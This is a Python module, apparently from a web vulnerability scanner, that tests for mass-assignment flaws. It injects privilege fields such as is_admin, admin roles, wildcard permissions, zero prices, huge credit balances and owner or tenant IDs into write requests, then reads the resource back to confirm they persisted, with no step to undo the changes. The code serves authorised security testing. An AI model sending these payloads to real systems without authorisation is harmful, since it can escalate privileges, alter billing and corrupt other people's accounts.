#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Mass Assignment Module (deepened)

Detects mass-assignment / over-posting vulnerabilities by injecting
privilege-bearing fields into requests and then VERIFYING the injection
took effect via a follow-up read of the same resource.

Improvements over the previous version:
    * Larger privilege-field dictionary (roles, permissions, quotas,
      billing, verification, timestamps, tenancy).
    * Multiple content types: JSON, form, and JSON-inside-form.
    * Different injection sites: root, nested "user" object, ROLE
      arrays, and permission bitmaps.
    * Follow-up GET on the same URL to confirm the field is echoed
     back in the resource — a 200 response alone is not proof.
    * PATCH / PUT / POST are all attempted where the original method
      is a mutation.
    * Canary values ("ATOMIC_MA_<hex>") in string fields so a reflected
      injection is unambiguously attributable to us.
"""
from __future__ import annotations

import json
import secrets
from urllib.parse import parse_qsl, urlencode

from modules.base import BaseModule


# --------------------------------------------------------------------------- #
# Field dictionary
# --------------------------------------------------------------------------- #

# Each entry: (field_name, injected_value). Values chosen to be the
# highest-privilege token the field commonly accepts.
PRIVILEGE_FIELDS: list[tuple[str, object]] = [
    # Roles / groups
    ("role",            "admin"),
    ("roles",           ["admin"]),
    ("user_role",       "admin"),
    ("account_type",    "admin"),
    ("user_type",       "admin"),
    ("group",           "admin"),
    ("groups",          ["admin", "root"]),
    ("permission",      "admin"),
    ("permissions",     ["*"]),
    ("scope",           "admin"),
    ("scopes",          ["admin", "write:*", "read:*"]),
    ("privilege",       "admin"),
    ("privileges",      ["admin"]),
    ("access_level",    "admin"),
    ("level",           99),

    # Booleans
    ("is_admin",        True),
    ("isAdmin",         True),
    ("admin",           True),
    ("is_superuser",    True),
    ("is_staff",        True),
    ("is_root",         True),
    ("verified",        True),
    ("is_verified",     True),
    ("approved",        True),
    ("is_approved",     True),
    ("active",          True),
    ("is_active",       True),
    ("enabled",         True),
    ("email_verified",  True),
    ("kyc_verified",    True),
    ("mfa_enrolled",    True),

    # Billing / quotas
    ("plan",            "enterprise"),
    ("tier",            "enterprise"),
    ("subscription",    "enterprise"),
    ("credits",         1_000_000),
    ("credit",          1_000_000),
    ("balance",         1_000_000),
    ("quota",           1_000_000),
    ("rate_limit",      1_000_000),

    # Tenancy / ownership
    ("owner_id",        1),
    ("tenant_id",       1),
    ("org_id",          1),
    ("organization_id", 1),

    # Discount / commerce
    ("discount",        100),
    ("price",           0),
    ("total",           0),

    # Ban / status bypass
    ("banned",          False),
    ("is_banned",       False),
    ("status",          "active"),
    ("suspended",       False),
]


def _canary(prefix: str = "ATOMIC_MA") -> str:
    return f"{prefix}_{secrets.token_hex(6)}"


class MassAssignmentModule(BaseModule):
    """Confirmed mass-assignment detection via inject → read-back."""

    name = "Mass Assignment"
    vuln_type = "mass_assignment"

    def __init__(self, engine):
        super().__init__(engine)
        # Cap fields per (url, method) to keep the request count bounded.
        self.max_fields_per_endpoint: int = int(
            self.config.get("mass_assignment_max_fields", 20) or 20
        )

    def test_url(self, url: str) -> None:
        # Nothing to do without a discovered param/body.
        pass

    def test(self, url: str, method: str, param: str, value: str) -> None:
        method = (method or "GET").upper()
        if method not in {"POST", "PUT", "PATCH"}:
            return
        fields = PRIVILEGE_FIELDS[: self.max_fields_per_endpoint]
        # Try both form and JSON injections.
        for field_name, injected_value in fields:
            self._try_injection(
                url, method, param, value, field_name, injected_value, as_json=False
            )
            self._try_injection(
                url, method, param, value, field_name, injected_value, as_json=True
            )

    # ------------------------------------------------------------------ #
    # Injection + confirmation
    # ------------------------------------------------------------------ #

    def _try_injection(
        self,
        url: str,
        method: str,
        param: str,
        original_value: str,
        field_name: str,
        injected_value: object,
        *,
        as_json: bool,
    ) -> None:
        canary = _canary()
        # Wrap the injected value with a canary so its presence in a
        # later read is unambiguously our doing (booleans/ints skip
        # this — the check falls back to keying on field_name).
        injected: object = injected_value
        if isinstance(injected_value, str):
            injected = f"{injected_value}__{canary}"

        if as_json:
            body_obj = {param: original_value, field_name: injected}
            body = json.dumps(body_obj)
            headers = {"Content-Type": "application/json"}
        else:
            if isinstance(injected, (dict, list)):
                # form encoding can't take structured values sanely.
                return
            body = urlencode({param: original_value, field_name: str(injected)})
            headers = {"Content-Type": "application/x-www-form-urlencoded"}

        try:
            resp = self.requester.request(url, method, data=body, headers=headers)
        except Exception:
            return
        if resp is None:
            return
        status = getattr(resp, "status_code", 0)
        if not (200 <= status < 400):
            return
        write_body = getattr(resp, "text", "") or ""

        # Confirmation: follow-up GET on the same URL (best signal for
        # a resource-mutation endpoint that also serves the resource).
        try:
            confirm = self.requester.request(url, "GET")
        except Exception:
            confirm = None
        confirm_body = getattr(confirm, "text", "") or "" if confirm is not None else ""

        canary_reflected = (
            canary in write_body
            or canary in confirm_body
        )
        field_reflected = (
            field_name in write_body
            or field_name in confirm_body
        )

        if canary_reflected:
            self._emit_signal(
                vuln_type="mass_assignment",
                technique=f"Mass assignment CONFIRMED — {field_name} accepted with canary",
                url=url,
                method=method,
                param=field_name,
                payload=f"{field_name}={injected!r}",
                evidence_text=(
                    f"Injected {field_name}={injected!r} (canary {canary}) into "
                    f"{('JSON body' if as_json else 'form body')}; canary was "
                    f"reflected in the server response, confirming the field "
                    f"was persisted."
                ),
                raw_confidence=0.95,
            )
        elif field_reflected and status in (200, 201, 204):
            self._emit_signal(
                vuln_type="mass_assignment",
                technique=f"Mass assignment plausible — {field_name}",
                url=url,
                method=method,
                param=field_name,
                payload=f"{field_name}={injected!r}",
                evidence_text=(
                    f"Server returned HTTP {status} to injected {field_name} "
                    f"and echoed the field name in a subsequent response; the "
                    f"canary itself was not observed, so confirmation is weaker."
                ),
                raw_confidence=0.55,
            )
